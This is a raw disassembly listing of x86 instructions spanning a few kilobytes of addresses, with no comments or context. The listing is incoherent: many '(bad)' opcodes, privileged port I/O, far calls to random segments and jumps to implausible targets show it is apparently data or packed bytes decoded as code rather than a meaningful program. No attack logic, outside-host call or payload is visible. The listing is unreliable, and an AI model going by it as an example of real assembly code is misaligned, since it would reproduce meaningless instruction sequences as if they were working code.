  4338ce:	mov    esi,0x4a492268
  4338d3:	add    al,0x94
  4338d5:	into   
  4338d6:	outs   dx,BYTE PTR ds:[esi]
  4338d7:	(bad)  [edx]
  4338d9:	call   0xe9a5:0x3caffd4b
  4338e0:	aad    0xf4
  4338e2:	and    bl,bl
  4338e4:	bound  ecx,QWORD PTR [ebx+0x389eb897]
  4338ea:	retf   0x87d5
  4338ed:	mov    ch,0xf1
  4338ef:	icebp  
  4338f0:	lock call 0x63d9:0x61b86e2b
  4338f8:	adc    eax,0xc2a88b21
  4338fd:	mov    esi,0x4e6a14bb
  433902:	pop    eax
  433903:	daa    
  433904:	xchg   ebp,eax
  433905:	test   edx,ebx
  433907:	out    dx,al
  433908:	add    BYTE PTR [edx-0x46e500bb],ah
  43390e:	es jge 0x43393f
  433911:	cmp    esp,ebp
  433913:	sub    esi,ecx
  433915:	mov    bh,0x1b
  433917:	mov    dl,0x6f
  433919:	lods   eax,DWORD PTR ds:[esi]
  43391a:	jno    0x43396e
  43391c:	sub    al,0xa0
  43391e:	or     al,bl
  433920:	sar    DWORD PTR [eax+ecx*2+0x31],cl
  433924:	ins    DWORD PTR es:[edi],dx
  433925:	icebp  
  433926:	ja     0x43390e
  433928:	xchg   sp,ax
  43392a:	fstp   DWORD PTR [ebx]
  43392c:	cmc    
  43392d:	sbb    al,0xca
  43392f:	xacquire xchg DWORD PTR [ebp+ebp*8-0x74d6d310],ecx
  433937:	jae    0x433984
  433939:	jg     0x433954
  43393b:	in     al,dx
  43393c:	jo     0x4338c6
  43393e:	push   0xffffffe7
  433940:	loopne 0x4339aa
  433942:	leave  
  433943:	sub    esi,DWORD PTR ds:0xdef99aa7
  433949:	and    BYTE PTR [edi-0x5a5c92],ah
  43394f:	adc    al,0x90
  433951:	mov    ecx,0xc9d02dbd
  433956:	jmp    0x433936
  433958:	sbb    al,0x74
  43395a:	and    al,0xa2
  43395c:	jle    0x4339b9
  43395e:	sub    eax,0x1416a460
  433963:	jbe    0x4339ae
  433965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433966:	adc    ah,al
  433968:	rcl    DWORD PTR [edx-0x4d8342bd],0xb3
  43396f:	fs aam 0xa3
  433972:	(bad)  
  433973:	lock mov ebp,0x9c6d0b9e
  433979:	lds    eax,FWORD PTR es:[esi+0x4e]
  43397d:	adc    ah,dh
  43397f:	test   eax,0x54bcdd57
  433984:	mov    WORD PTR [ecx],ds
  433986:	fdiv   QWORD PTR [ecx-0x5b]
  433989:	sbb    ebx,0xffffffe9
  43398c:	ins    DWORD PTR es:[edi],dx
  43398d:	aam    0x7d
  43398f:	xchg   ecx,eax
  433990:	sbb    DWORD PTR [ecx-0x7d],ebp
  433993:	mov    ecx,0x436858ad
  433998:	or     al,0x85
  43399a:	outs   dx,DWORD PTR ds:[esi]
  43399b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43399c:	push   ds
  43399d:	adc    DWORD PTR ds:0xf010a26b,esi
  4339a3:	test   eax,0xb0d9b917
  4339a8:	jmp    0x713f4a3a
  4339ad:	and    ebx,esp
  4339af:	xchg   esp,eax
  4339b0:	xchg   edi,eax
  4339b1:	and    al,dl
  4339b3:	lods   al,BYTE PTR ds:[esi]
  4339b4:	mov    ecx,0x4efadc2
  4339b9:	(bad)  
  4339ba:	mov    ds:0xb0702334,al
  4339bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4339c0:	sbb    eax,0x15586adf
  4339c5:	xor    eax,DWORD PTR [ebx+0x2510daf1]
  4339cb:	pop    edi
  4339cc:	sbb    eax,0x412cedf9
  4339d1:	xchg   esi,eax
  4339d2:	das    
  4339d3:	cli    
  4339d4:	ret    
  4339d5:	cdq    
  4339d6:	mov    edx,DWORD PTR [ebp-0x16]
  4339d9:	ret    0xa4a9
  4339dc:	(bad)  
  4339dd:	lods   al,BYTE PTR ds:[esi]
  4339de:	push   0xffffffcb
  4339e0:	and    DWORD PTR [esi-0x42],ebp
  4339e3:	aam    0xd8
  4339e5:	scas   al,BYTE PTR es:[edi]
  4339e6:	test   esp,ecx
  4339e8:	lds    edx,FWORD PTR [ecx+edx*8]
  4339eb:	icebp  
  4339ec:	(bad)  
  4339ed:	scas   eax,DWORD PTR es:[edi]
  4339ee:	push   edx
  4339ef:	pop    ds
  4339f0:	cld    
  4339f1:	jl     0x4339e0
  4339f3:	mov    bh,0x2e
  4339f5:	(bad)  
  4339f6:	in     al,dx
  4339f7:	bound  ebx,QWORD PTR [ebx]
  4339f9:	clc    
  4339fa:	mov    ebp,0x6b9cf9dd
  4339ff:	xchg   ebp,eax
  433a00:	cs mov edi,0x30528277
  433a06:	icebp  
  433a07:	shl    DWORD PTR [eax+0x39],0x92
  433a0b:	inc    ebp
  433a0c:	and    al,0x71
  433a0e:	push   ebx
  433a0f:	pop    edi
  433a10:	inc    esp
  433a11:	fnstcw WORD PTR [edi+0x3d94c185]
  433a17:	jb     0x433a84
  433a19:	test   al,0x8f
  433a1b:	enter  0xc969,0x47
  433a1f:	xchg   ecx,eax
  433a20:	pop    ds
  433a21:	jns    0x4339c7
  433a23:	aas    
  433a24:	out    dx,eax
  433a25:	or     BYTE PTR [esp+ebx*2+0x17],bl
  433a29:	test   al,0x2b
  433a2b:	lea    edx,[esi]
  433a2d:	dec    ebx
  433a2e:	sub    ecx,0x4700813c
  433a34:	je     0x433a87
  433a36:	mov    ebx,0x45d0ed14
  433a3b:	sbb    edx,DWORD PTR [esi]
  433a3d:	bound  ecx,QWORD PTR [edx]
  433a3f:	adc    eax,0x6fbe03c7
  433a44:	clc    
  433a45:	popa   
  433a46:	outs   dx,BYTE PTR ss:[esi]
  433a48:	cwde   
  433a49:	rcr    al,0x82
  433a4c:	ins    DWORD PTR es:[edi],dx
  433a4d:	cwde   
  433a4e:	mov    dh,0xd4
  433a50:	in     al,0xc0
  433a52:	jbe    0x433a7e
  433a54:	imul   ebp,DWORD PTR [edi],0x58b0c543
  433a5a:	mov    esp,0x14f2347c
  433a5f:	shl    ebp,0xc2
  433a62:	mov    bl,0x24
  433a64:	shl    BYTE PTR [eax-0x12],1
  433a67:	jb     0x4339ff
  433a69:	pop    ebx
  433a6a:	dec    edx
  433a6b:	add    eax,esi
  433a6d:	rol    DWORD PTR [eax+0x5740521a],1
  433a73:	daa    
  433a74:	and    DWORD PTR [ebp-0x2a4fa98c],ebp
  433a7a:	mov    ebp,0xabcfccb4
  433a7f:	(bad)  
  433a80:	sbb    ebp,edx
  433a82:	out    0xf0,eax
  433a84:	pop    es
  433a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433a86:	jecxz  0x433ae0
  433a88:	adc    BYTE PTR [esi+0x45],0xb
  433a8c:	cmc    
  433a8d:	(bad)  
  433a8e:	mov    ecx,0x7198c6d4
  433a93:	mov    eax,0x5e5c12a6
  433a98:	nop
  433a99:	idiv   DWORD PTR [ebx-0x1c]
  433a9c:	shl    BYTE PTR [ecx-0x27fa9ac5],0xf3
  433aa3:	or     DWORD PTR [ebx],0x12d2fba5
  433aa9:	scas   eax,DWORD PTR es:[edi]
  433aaa:	fisttp QWORD PTR [ebp-0x2a5c1de]
  433ab0:	cmc    
  433ab1:	fdiv   DWORD PTR [edi-0x495d26ac]
  433ab7:	dec    esi
  433ab8:	jne    0x433b1b
  433aba:	mov    ebp,0x6e3cb3f3
  433abf:	jmp    0x433ae5
  433ac1:	mov    ecx,0xa3b6998e
  433ac6:	dec    esi
  433ac7:	inc    edx
  433ac8:	jns    0x433b28
  433aca:	rcl    ebp,cl
  433acc:	out    0x10,al
  433ace:	jmp    0x131c516f
  433ad3:	das    
  433ad4:	xchg   ebp,eax
  433ad5:	dec    ebx
  433ad6:	push   ebx
  433ad7:	xor    eax,0xa6271025
  433adc:	fild   QWORD PTR [ebp-0x5fbc7b4b]
  433ae2:	or     ebp,esi
  433ae4:	in     al,dx
  433ae5:	aas    
  433ae6:	in     al,0xce
  433ae8:	xchg   ecx,eax
  433ae9:	pusha  
  433aea:	das    
  433aeb:	xchg   esi,eax
  433aec:	ins    DWORD PTR es:[edi],dx
  433aed:	inc    ebx
  433aee:	xor    eax,0xb2ddff87
  433af3:	inc    esp
  433af4:	movnti DWORD PTR [eax+0x281975c1],esi
  433afb:	out    dx,al
  433afc:	cld    
  433afd:	xchg   DWORD PTR fs:0xe956eb0d,esp
  433b04:	daa    
  433b05:	jne    0x433ae2
  433b07:	adc    ch,dl
  433b09:	ins    BYTE PTR es:[edi],dx
  433b0a:	outs   dx,DWORD PTR fs:[esi]
  433b0c:	push   edx
  433b0d:	push   eax
  433b0e:	jmp    DWORD PTR [ecx+0x16]
  433b11:	mov    eax,ds:0x4f514ca6
  433b16:	loop   0x433aa7
  433b18:	and    cl,bl
  433b1a:	xchg   ecx,eax
  433b1b:	shl    DWORD PTR [edx+0x424740be],0x48
  433b22:	ret    
  433b23:	outs   dx,DWORD PTR ds:[esi]
  433b24:	xchg   BYTE PTR [ebx-0x51],ah
  433b27:	sbb    BYTE PTR [eax+0x7218f1f0],ah
  433b2d:	xchg   edx,eax
  433b2e:	xor    eax,0xb3cea8f1
  433b33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433b34:	sub    dh,0xec
  433b37:	sti    
  433b38:	push   es
  433b39:	jp     0x433af9
  433b3b:	pop    eax
  433b3c:	hlt    
  433b3d:	mov    ds:0xb0c2fc90,eax
  433b42:	and    bh,BYTE PTR [esi-0x2b41e168]
  433b48:	mov    ds:0xd64ffa71,al
  433b4d:	in     eax,dx
  433b4e:	arpl   bx,cx
  433b50:	sbb    bl,bl
  433b52:	hlt    
  433b53:	cli    
  433b54:	shr    DWORD PTR [ebx],0xb5
  433b57:	push   0xffffff8b
  433b59:	add    al,0xb0
  433b5b:	inc    esp
  433b5c:	rol    esp,1
  433b5e:	rol    BYTE PTR ss:[ebp-0x410c2fce],cl
  433b65:	ja     0x433b75
  433b67:	or     BYTE PTR [edx+0x5a174930],0x34
  433b6e:	mov    edi,0xd6d0ee54
  433b73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433b74:	gs iret 
  433b76:	sub    eax,0x91e2b2f0
  433b7b:	jae    0x433bc5
  433b7d:	jo     0x433aff
  433b7f:	lock sub esi,DWORD PTR [ebx-0xd3c9b4c]
  433b86:	out    dx,al
  433b87:	sub    al,0x95
  433b89:	je     0x433b84
  433b8b:	lock in eax,0xf0
  433b8e:	leave  
  433b8f:	xchg   esi,eax
  433b90:	sbb    bh,BYTE PTR [ecx-0x4d713911]
  433b96:	jp     0x433c10
  433b98:	aaa    
  433b99:	mov    ds:0x9a88d81b,al
  433b9e:	jbe    0x433b62
  433ba0:	aaa    
  433ba1:	xlat   BYTE PTR ds:[ebx]
  433ba2:	mov    DWORD PTR ds:0x94e3bb5c,edx
  433ba8:	lds    ebx,FWORD PTR [ebx]
  433baa:	xchg   DWORD PTR [ebx+0x73],eax
  433bad:	pusha  
  433bae:	(bad)  
  433baf:	stc    
  433bb0:	inc    edi
  433bb1:	and    ecx,ecx
  433bb3:	xchg   ebp,eax
  433bb4:	sub    bl,BYTE PTR [ebx]
  433bb6:	call   0x2591:0x66489df5
  433bbd:	fldenv [esp+eax*2-0x61695851]
  433bc4:	inc    ebx
  433bc5:	lahf   
  433bc6:	stos   DWORD PTR es:[edi],eax
  433bc7:	mov    ds:0x62250f84,al
  433bcc:	pop    ss
  433bcd:	shl    BYTE PTR ds:0xbd9965fc,0x4
  433bd4:	mov    eax,0x65ffdcc9
  433bd9:	cmp    cl,BYTE PTR [ecx-0x5dc21a19]
  433bdf:	mov    ebx,0x9d5ac973
  433be4:	repnz mov ah,0xa1
  433be7:	test   eax,0xbee43f
  433bec:	xchg   ebp,eax
  433bed:	test   eax,0x340e7ea
  433bf2:	and    eax,0xd65cfb3f
  433bf7:	js     0x433bde
  433bf9:	sbb    ah,BYTE PTR [eax+ebp*8+0x202ef3c4]
  433c00:	inc    ebp
  433c01:	bound  ecx,QWORD PTR [ecx-0x12]
  433c04:	mov    ebp,0x8671fdd4
  433c09:	test   eax,0x9695365c
  433c0e:	mov    edx,0xb8202adf
  433c13:	cs cmc 
  433c15:	push   edx
  433c16:	push   0xffffffef
  433c18:	loop   0x433c71
  433c1a:	shl    BYTE PTR [ebx],0xe6
  433c1d:	pop    edx
  433c1e:	jbe    0x433c48
  433c20:	pop    ss
  433c21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433c22:	inc    edx
  433c23:	xchg   BYTE PTR [eax],ah
  433c25:	sahf   
  433c26:	stos   DWORD PTR es:[edi],eax
  433c27:	lea    eax,[eax]
  433c29:	xor    BYTE PTR [eax-0x61],cl
  433c2c:	mov    edx,DWORD PTR [edi-0x171e5281]
  433c32:	mov    esi,0x979a7614
  433c37:	or     eax,0xf19b9c14
  433c3c:	mov    eax,ds:0xdf13873a
  433c41:	ins    BYTE PTR es:[edi],dx
  433c42:	and    ecx,DWORD PTR [ebx+0x2ca4391d]
  433c48:	adc    al,0xeb
  433c4a:	loop   0x433c71
  433c4c:	mov    ah,BYTE PTR [eax-0x6010e8d5]
  433c52:	test   eax,0xea275051
  433c57:	dec    ebp
  433c58:	stc    
  433c59:	mov    edi,0x64b0f4be
  433c5e:	psubb  mm2,QWORD PTR [edi-0x7c]
  433c62:	push   eax
  433c63:	aad    0x7d
  433c65:	push   ecx
  433c66:	out    dx,al
  433c67:	in     al,0x27
  433c69:	clc    
  433c6a:	push   edi
  433c6b:	fs jne 0x433c88
  433c6e:	mov    cl,0xfb
  433c70:	sbb    eax,0x99560709
  433c75:	jo     0x433c77
  433c77:	mov    eax,DWORD PTR [ebp-0x640d5e68]
  433c7d:	cwde   
  433c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433c7f:	ja     0x433ca2
  433c81:	test   eax,0xb574182
  433c86:	enter  0x9089,0x9d
  433c8a:	fwait
  433c8b:	sbb    al,0xd3
  433c8d:	loope  0x433c38
  433c8f:	pop    ebx
  433c90:	dec    esi
  433c91:	xchg   esi,eax
  433c92:	lods   eax,DWORD PTR cs:[esi]
  433c94:	and    bh,BYTE PTR [ecx]
  433c96:	adc    al,0xd3
  433c98:	pop    es
  433c99:	sbb    DWORD PTR [esi+0x74],ebx
  433c9c:	lea    edi,[eax+0x5950d07b]
  433ca2:	sar    BYTE PTR [edx-0x7f],cl
  433ca5:	sbb    BYTE PTR [edi+0x16],0x98
  433ca9:	mov    ds:0xfaab82bb,eax
  433cae:	das    
  433caf:	jecxz  0x433c88
  433cb1:	stos   BYTE PTR es:[edi],al
  433cb2:	adc    al,0x18
  433cb4:	sub    DWORD PTR [esi],ecx
  433cb6:	in     eax,0x14
  433cb8:	add    bl,BYTE PTR ds:0x9ee071f7
  433cbe:	pop    ebx
  433cbf:	(bad)  
  433cc0:	xchg   esi,eax
  433cc1:	or     al,cl
  433cc3:	push   eax
  433cc4:	scas   eax,DWORD PTR es:[edi]
  433cc5:	(bad)  
  433cc6:	in     al,dx
  433cc7:	out    dx,al
  433cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433cc9:	mov    eax,ds:0xf41c9873
  433cce:	push   0xeba9bcfe
  433cd3:	push   ss
  433cd4:	in     al,0xee
  433cd6:	sub    dh,BYTE PTR [edx+ecx*1+0x1746b965]
  433cdd:	je     0x433d06
  433cdf:	mov    bl,0x83
  433ce1:	fsubrp st(6),st
  433ce3:	aam    0xaa
  433ce5:	and    eax,0xab84d8f7
  433cea:	sti    
  433ceb:	in     al,dx
  433cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433ced:	mov    bh,0xdb
  433cef:	jb     0x433d05
  433cf1:	in     al,0x9
  433cf3:	call   FWORD PTR [edi]
  433cf5:	cdq    
  433cf6:	push   edi
  433cf7:	cmp    ah,cl
  433cf9:	es push esp
  433cfb:	packuswb mm5,QWORD PTR [eax-0x3c87dd45]
  433d02:	(bad)  
  433d03:	(bad)  
  433d04:	inc    dl
  433d06:	dec    esi
  433d07:	aad    0xfb
  433d09:	dec    esi
  433d0a:	mov    esp,0x7e06a514
  433d0f:	jb     0x433d77
  433d11:	(bad)  [ebx+0x329c2963]
  433d17:	jno    0x433d47
  433d19:	and    BYTE PTR [edx-0x44],bl
  433d1c:	in     al,0x30
  433d1e:	mov    esp,0xe18e38b4
  433d23:	shl    BYTE PTR ds:0x77f0fe50,1
  433d29:	cwde   
  433d2a:	jb     0x433cee
  433d2c:	and    cl,bl
  433d2e:	cmp    eax,0x23fe8e2e
  433d33:	pop    eax
  433d34:	cmp    ebx,DWORD PTR [ebx+0x59ebb72b]
  433d3a:	addr16 dec ebp
  433d3c:	sahf   
  433d3d:	fild   QWORD PTR [eax-0x42502111]
  433d43:	test   BYTE PTR [ecx-0xa5b6a50],dh
  433d49:	add    DWORD PTR [ebx-0x8f6ad1a],0xffffffe7
  433d50:	and    ebx,DWORD PTR [ecx+0x35]
  433d53:	repnz dec eax
  433d55:	and    eax,DWORD PTR [ecx+0x79]
  433d58:	iret   
  433d59:	sbb    DWORD PTR [edx+esi*8-0x408ecfeb],0xc39f931a
  433d64:	jae    0x433daf
  433d66:	repz cmp eax,0xb4befce3
  433d6c:	xchg   edi,eax
  433d6d:	clc    
  433d6e:	adc    eax,0xa0f7a54b
  433d73:	out    0x25,al
  433d75:	scas   al,BYTE PTR es:[edi]
  433d76:	scas   eax,DWORD PTR es:[edi]
  433d77:	adc    dl,BYTE PTR [edi]
  433d79:	fldcw  WORD PTR [ebp+0x0]
  433d7c:	mov    ch,0x56
  433d7e:	test   cl,bh
  433d80:	ret    0xbba8
  433d83:	add    ebp,DWORD PTR [esi]
  433d85:	arpl   WORD PTR [eax-0x23489ab5],cx
  433d8b:	cs mov ebp,0x5a84bc04
  433d91:	jmp    0x433de4
  433d93:	retf   
  433d94:	mov    ch,0xe5
  433d96:	mov    ds:0xbe8618f0,al
  433d9b:	or     eax,0xef60f994
  433da0:	das    
  433da1:	scas   eax,DWORD PTR es:[edi]
  433da2:	dec    eax
  433da3:	cwde   
  433da4:	pop    edi
  433da5:	sub    cl,dh
  433da7:	aaa    
  433da8:	icebp  
  433da9:	cmc    
  433daa:	mov    ebx,0x7d8a1bca
  433daf:	call   0x61db:0xe48fa557
  433db6:	(bad)  
  433db8:	pop    ss
  433db9:	test   eax,0x994e411a
  433dbe:	push   cs
  433dbf:	out    dx,eax
  433dc0:	pop    esi
  433dc1:	mov    al,ds:0x37dd3e5b
  433dc6:	in     eax,0x9d
  433dc8:	mov    ebp,0x486d24b1
  433dcd:	dec    esi
  433dce:	jmp    0x433dc4
  433dd0:	cmc    
  433dd1:	sub    BYTE PTR [esi+0x5b9b0938],al
  433dd7:	or     al,0xf3
  433dd9:	in     eax,dx
  433dda:	mov    bh,0x4e
  433ddc:	mov    eax,ds:0x693582c9
  433de1:	imul   esi,DWORD PTR [ebp-0x596423d],0xb81ecc49
  433deb:	sar    BYTE PTR ds:0x883dacce,0x94
  433df2:	dec    esp
  433df3:	mov    al,ds:0x1c94c925
  433df8:	jmp    0xbbec:0x7a7718d3
  433dff:	xchg   esp,eax
  433e00:	xor    eax,0xb58cfdf2
  433e05:	data16 js 0x433dee
  433e08:	add    al,BYTE PTR [esi]
  433e0a:	cld    
  433e0b:	cmp    ebp,ecx
  433e0d:	cdq    
  433e0e:	aam    0x1d
  433e10:	jae    0x433e04
  433e12:	stos   BYTE PTR es:[edi],al
  433e13:	sub    al,0x19
  433e15:	and    al,0xb6
  433e17:	or     al,0xe4
  433e19:	push   0xc
  433e1b:	(bad)  
  433e1c:	arpl   WORD PTR [ecx-0x6a9812af],dx
  433e22:	or     al,0xe0
  433e24:	pop    esi
  433e25:	(bad)  
  433e26:	mov    edi,0xcba5b054
  433e2b:	int    0xad
  433e2d:	arpl   bp,dx
  433e2f:	xchg   ecx,eax
  433e30:	not    DWORD PTR [esp+ebp*8-0x7f]
  433e34:	aad    0xd5
  433e36:	mov    edi,eax
  433e38:	(bad)  
  433e39:	clc    
  433e3a:	push   ss
  433e3b:	adc    edi,ebx
  433e3d:	adc    al,0xe6
  433e3f:	imul   edx,DWORD PTR ds:0xbbe985ac,0x1f92e1df
  433e49:	dec    ecx
  433e4a:	fidiv  DWORD PTR [eax+0x328e6ac5]
  433e50:	cld    
  433e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433e52:	cmp    eax,DWORD PTR [ebx+0x269742a2]
  433e58:	inc    ebp
  433e59:	and    eax,0xf7ca0431
  433e5e:	mov    ds:0x20252047,eax
  433e63:	pop    ecx
  433e64:	repz test al,0x3b
  433e67:	push   ecx
  433e68:	dec    edx
  433e69:	xor    al,BYTE PTR [ebx+ecx*8-0x65]
  433e6d:	and    bh,BYTE PTR [edi-0x5]
  433e70:	push   edx
  433e71:	fnstsw WORD PTR [ecx+0x71d92a4]
  433e77:	dec    ebx
  433e78:	aad    0x81
  433e7a:	mov    ebx,gs
  433e7c:	data16 xchg BYTE PTR [edx-0x54],ah
  433e80:	aad    0xb0
  433e82:	cld    
  433e83:	and    bh,dl
  433e85:	out    0x23,al
  433e87:	cmc    
  433e88:	or     DWORD PTR [esi-0x382c5055],esp
  433e8e:	cmp    BYTE PTR [edx],ah
  433e90:	int    0x8a
  433e92:	dec    edi
  433e93:	sbb    ah,BYTE PTR [ecx]
  433e95:	leave  
  433e96:	ss call 0xa923:0x3f1ad497
  433e9e:	scas   al,BYTE PTR es:[edi]
  433e9f:	xchg   ecx,eax
  433ea0:	push   ebx
  433ea1:	popf   
  433ea2:	mov    al,ds:0x799f1fe9
  433ea7:	and    ah,dh
  433ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433eaa:	jnp    0x433e71
  433eac:	pop    esi
  433ead:	xchg   esi,eax
  433eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433eaf:	xor    al,0x4
  433eb1:	jmp    0x433e5a
  433eb3:	pop    ebp
  433eb4:	call   0x647f:0xc34b142
  433ebb:	inc    edx
  433ebc:	aaa    
  433ebd:	aas    
  433ebe:	push   0x9d44d9cb
  433ec3:	in     eax,0x11
  433ec5:	mov    ebx,0x851a923c
  433eca:	loopne 0x433ea0
  433ecc:	xchg   edx,eax
  433ecd:	mov    eax,ds:0xa15a4cc3
  433ed2:	or     edx,DWORD PTR [esi]
  433ed4:	mov    ds:0x2032b008,al
  433ed9:	enter  0x6224,0xaa
  433edd:	pop    ebx
  433ede:	mov    ah,0x84
  433ee0:	jnp    0x433f10
  433ee2:	bnd jbe 0x433f1a
  433ee5:	xchg   BYTE PTR [ebp+0x7f80a3ed],bl
  433eeb:	push   esp
  433eec:	and    BYTE PTR [ecx-0x3247c1ce],bh
  433ef2:	and    DWORD PTR ds:0x44db9d5e,eax
  433ef8:	jmp    0x6384f2de
  433efd:	push   edi
  433efe:	mov    bl,0xae
  433f00:	aas    
  433f01:	(bad)  
  433f02:	mov    ebp,0x9a584f04
  433f07:	and    DWORD PTR ds:0x9af16707,eax
  433f0d:	sub    al,0x62
  433f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433f10:	push   ebx
  433f11:	or     edx,ebp
  433f13:	les    ebx,FWORD PTR [edx+eiz*1-0x4adea10c]
  433f1a:	stos   DWORD PTR es:[edi],eax
  433f1b:	mov    al,0x46
  433f1d:	(bad)  
  433f1e:	ins    BYTE PTR es:[edi],dx
  433f1f:	or     eax,0xe8643b53
  433f24:	adc    BYTE PTR [esi-0x533d1d48],al
  433f2a:	and    ah,BYTE PTR [edx]
  433f2c:	xchg   BYTE PTR [ebp-0x54],cl
  433f2f:	jns    0x433f26
  433f31:	ffreep st(0)
  433f33:	repz imul ebx,DWORD PTR ds:0xe7759983,0x1c
  433f3b:	out    0x2b,eax
  433f3d:	test   DWORD PTR [eax+eax*8+0x1b],edx
  433f41:	mov    ecx,0x7d1161a8
  433f46:	add    esp,DWORD PTR [esp+edi*2-0x3f]
  433f4a:	sub    ecx,DWORD PTR [ebx-0x50]
  433f4d:	mov    WORD PTR [esi-0x49],ds
  433f50:	push   ds
  433f51:	fbld   TBYTE PTR [eax-0x5a]
  433f54:	and    DWORD PTR [ecx+0x1c5034a0],ecx
  433f5a:	scas   eax,DWORD PTR es:[edi]
  433f5b:	sbb    al,0x70
  433f5d:	sub    DWORD PTR [ebx-0x414f1a1a],edi
  433f63:	dec    esp
  433f64:	mov    dh,0x67
  433f66:	fldcw  WORD PTR [ebp-0x66]
  433f69:	outs   dx,DWORD PTR ds:[esi]
  433f6a:	jae    0x433fb3
  433f6c:	int3   
  433f6d:	sub    edi,DWORD PTR [ecx-0x4462d75c]
  433f73:	scas   al,BYTE PTR es:[edi]
  433f74:	jo     0x433f2d
  433f76:	ja     0x433ff6
  433f78:	fwait
  433f79:	lods   al,BYTE PTR ds:[esi]
  433f7a:	and    al,0xa3
  433f7c:	and    al,0x92
  433f7e:	sti    
  433f7f:	xor    dl,BYTE PTR [ecx-0x60]
  433f82:	cmp    ebx,edx
  433f84:	mov    dh,0x3c
  433f86:	ret    0x7322
  433f89:	jnp    0x433f87
  433f8b:	mov    ah,0x94
  433f8d:	jg     0x434007
  433f8f:	js     0x433fb3
  433f91:	cmp    DWORD PTR [edi-0x5aa6dc72],0xe2d8dc4a
  433f9b:	jp     0x433f8b
  433f9d:	cmp    al,0xec
  433f9f:	enterw 0xee98,0x64
  433fa4:	push   es
  433fa5:	add    DWORD PTR [eax-0x420bc42f],edi
  433fab:	pushf  
  433fac:	clc    
  433fad:	jp     0x43400c
  433faf:	into   
  433fb0:	sbb    al,0xc5
  433fb2:	jg     0x433f52
  433fb4:	scas   eax,DWORD PTR es:[edi]
  433fb5:	mov    ch,0x57
  433fb7:	shl    DWORD PTR [ebp-0x5bf94460],cl
  433fbd:	and    al,0xdf
  433fbf:	jg     0x434035
  433fc1:	ds jae 0x43400a
  433fc4:	stos   BYTE PTR es:[edi],al
  433fc5:	js     0x433f79
  433fc7:	je     0x433fb6
  433fc9:	and    al,0xb5
  433fcb:	fadd   QWORD PTR [esp+ebx*4-0x15]
  433fcf:	data16 cmp al,0x48
  433fd2:	sub    al,0x79
  433fd4:	out    dx,al
  433fd5:	push   eax
  433fd6:	push   edi
  433fd7:	cdq    
  433fd8:	mov    dl,0xa9
  433fda:	unpckhps xmm3,XMMWORD PTR [edi]
  433fdd:	push   ebp
  433fde:	jo     0x433fda
  433fe0:	cmp    DWORD PTR es:[edx-0x16],ecx
  433fe4:	vxorps xmm5,xmm3,xmm7
  433fe8:	frstor [ebp-0x24]
  433feb:	pop    ebp
  433fec:	bound  edi,QWORD PTR [ecx]
  433fee:	test   ebp,ecx
  433ff0:	mov    DWORD PTR [ebp+edi*1-0x463c69fa],esp
  433ff7:	push   eax
  433ff8:	and    eax,0xa8eb8e69
  433ffd:	jp     0x43404c
  433fff:	das    
  434000:	and    DWORD PTR [ecx-0x2d35623e],ecx
  434006:	or     eax,esp
  434008:	pop    esi
  434009:	mov    ds:0xac5e3c3b,al
  43400e:	cld    
  43400f:	pop    ds
  434010:	stos   BYTE PTR es:[edi],al
  434011:	hlt    
  434012:	dec    esi
  434013:	js     0x434090
  434015:	xchg   edi,eax
  434016:	and    DWORD PTR [ebp+0x6411c418],esp
  43401c:	dec    eax
  43401d:	retf   0xdbec
  434020:	push   esi
  434021:	jnp    0x433fba
  434023:	jbe    0x433fe7
  434025:	mov    ebp,0x8b0be4bd
  43402a:	cmp    al,0x7
  43402c:	(bad)  
  43402d:	pop    esi
  43402e:	aam    0x92
  434030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434031:	xor    eax,0x594a66bc
  434036:	loop   0x433fdd
  434038:	sbb    BYTE PTR [esi+eax*1+0x29],al
  43403c:	xchg   esp,eax
  43403d:	and    bh,BYTE PTR [esp+ebp*8+0x20b599c6]
  434044:	mov    ds:0x18cc9908,eax
  434049:	sar    BYTE PTR [edx],1
  43404b:	xor    DWORD PTR [edi-0x58],0xffffffb0
  43404f:	and    al,0x95
  434051:	call   0xeb96:0x8c750f73
  434058:	popf   
  434059:	cmc    
  43405a:	icebp  
  43405b:	mov    ebp,0x95be791e
  434060:	test   dh,bl
  434062:	mov    BYTE PTR [ecx+edi*8+0x23],dh
  434066:	daa    
  434067:	jno    0x43406e
  434069:	call   0x1f3b2ef2
  43406e:	out    dx,al
  43406f:	pop    ecx
  434070:	dec    esi
  434071:	mov    ecx,0x2ce7c6c7
  434076:	jp     0x4340c0
  434078:	inc    ecx
  434079:	adc    DWORD PTR [ebp+0xa79b566],edx
  43407f:	jmp    0x4340ec
  434081:	xchg   edx,eax
  434082:	or     BYTE PTR [ebp+edi*2+0x1f1bcb5a],bl
  434089:	mov    DWORD PTR [esi+edx*4],esp
  43408c:	pop    esp
  43408d:	ds in  al,dx
  43408f:	push   0x1d
  434091:	jp     0x43409f
  434093:	rcl    BYTE PTR [ebp+0x74],cl
  434096:	jle    0x4340f4
  434098:	mov    BYTE PTR [ebp-0x41],bl
  43409b:	mov    ah,BYTE PTR [ebx-0x743ac538]
  4340a1:	cli    
  4340a2:	mov    dh,0xa4
  4340a4:	push   ebp
  4340a5:	sti    
  4340a6:	pop    ebx
  4340a7:	mov    ah,dl
  4340a9:	mov    al,ds:0x9dda0dbb
  4340ae:	frstor [edx+0x34295e97]
  4340b4:	je     0x43408c
  4340b6:	mov    ah,0xc4
  4340b8:	rcl    DWORD PTR [edx],1
  4340ba:	or     dl,BYTE PTR [eax+0x35]
  4340bd:	sub    al,0x58
  4340bf:	in     eax,dx
  4340c0:	sbb    DWORD PTR [eax],0x4b
  4340c3:	out    0x18,eax
